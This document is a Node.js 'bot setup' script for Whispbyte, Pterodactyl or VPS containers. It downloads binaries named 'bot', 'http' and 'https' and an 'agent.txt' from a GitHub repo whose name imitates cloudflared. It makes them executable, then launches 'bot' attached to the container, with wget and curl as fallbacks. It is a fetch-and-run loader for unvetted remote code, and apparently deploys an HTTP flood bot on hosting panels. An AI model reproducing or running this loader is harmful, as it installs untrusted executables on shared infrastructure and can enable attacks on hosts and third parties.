/**
 * Bot Setup Script for Whispbyte / Pterodactyl / VPS
 * Downloads statically compiled bot binaries and agent.txt
 * Supports HTTP/HTTPS download with automatic wget/curl fallback
 * Keeps process attached to container lifecycle
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { spawn, execSync } = require('child_process');

const REPO_BASE = 'https://raw.githubusercontent.com/cloudflared9-hub/agent/main';

const FILES_TO_DOWNLOAD = [
    { url: `${REPO_BASE}/bots/bot`, filename: 'bot', executable: true },
    { url: `${REPO_BASE}/bots/http`, filename: 'http', executable: true },
    { url: `${REPO_BASE}/bots/https`, filename: 'https', executable: true },
    { url: `${REPO_BASE}/agent.txt`, filename: 'agent.txt', executable: false }
];

function downloadHttp(url, destPath) {
    return new Promise((resolve, reject) => {
        const client = url.startsWith('https') ? https : http;

        client.get(url, (res) => {
            if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                return downloadHttp(res.headers.location, destPath).then(resolve).catch(reject);
            }

            if (res.statusCode !== 200) {
                return reject(new Error(`HTTP status ${res.statusCode}`));
            }

            const fileStream = fs.createWriteStream(destPath);
            res.pipe(fileStream);

            fileStream.on('finish', () => {
                fileStream.close(resolve);
            });

            fileStream.on('error', (err) => {
                fs.unlink(destPath, () => {});
                reject(err);
            });
        }).on('error', (err) => {
            fs.unlink(destPath, () => {});
            reject(err);
        });
    });
}

function downloadWgetOrCurl(url, destPath) {
    try {
        execSync(`wget -q -O "${destPath}" "${url}"`, { stdio: 'ignore' });
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return true;
    } catch (_) {}

    try {
        execSync(`curl -s -L -o "${destPath}" "${url}"`, { stdio: 'ignore' });
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return true;
    } catch (_) {}

    return false;
}

async function downloadFile(url, destPath) {
    try {
        await downloadHttp(url, destPath);
        if (fs.existsSync(destPath) && fs.statSync(destPath).size > 0) return;
    } catch (_) {}

    const ok = downloadWgetOrCurl(url, destPath);
    if (!ok) {
        throw new Error(`Failed to download from ${url}`);
    }
}

async function setup() {
    const targetDir = process.cwd();
    console.log(`[+] Setting up Whispbyte Bot in: ${targetDir}`);

    for (const item of FILES_TO_DOWNLOAD) {
        const dest = path.join(targetDir, item.filename);
        try {
            process.stdout.write(`[*] Downloading ${item.filename}... `);
            const nocacheUrl = `${item.url}?t=${Date.now()}`;
            await downloadFile(nocacheUrl, dest);
            console.log('OK');

            if (item.executable) {
                fs.chmodSync(dest, 0o755);
                console.log(`[+] Set chmod +x for ${item.filename}`);
            }
        } catch (err) {
            console.log('FAILED');
            console.error(`[!] Error downloading ${item.filename}: ${err.message}`);
        }
    }

    const botBinPath = path.join(targetDir, 'bot');
    if (fs.existsSync(botBinPath)) {
        console.log('[+] Launching Bot process (attached to container)...');
        const child = spawn(botBinPath, [], {
            cwd: targetDir,
            stdio: ['inherit', 'pipe', 'pipe']
        });

        child.stdout.on('data', (data) => {
            process.stdout.write(data);
        });

        child.stderr.on('data', (data) => {
            process.stderr.write(data);
        });

        child.on('error', (err) => {
            console.error(`[!] Failed to start bot process: ${err.message}`);
            process.exit(1);
        });

        child.on('exit', (code, signal) => {
            console.log(`[!] Bot process exited with code ${code} (signal: ${signal})`);
            process.exit(code || 0);
        });

        process.on('SIGINT', () => child.kill('SIGINT'));
        process.on('SIGTERM', () => child.kill('SIGTERM'));
    } else {
        console.error('[-] Bot binary not found, execution skipped.');
        process.exit(1);
    }
}

setup().catch((err) => {
    console.error(`[!] Setup failed: ${err.message}`);
    process.exit(1);
});
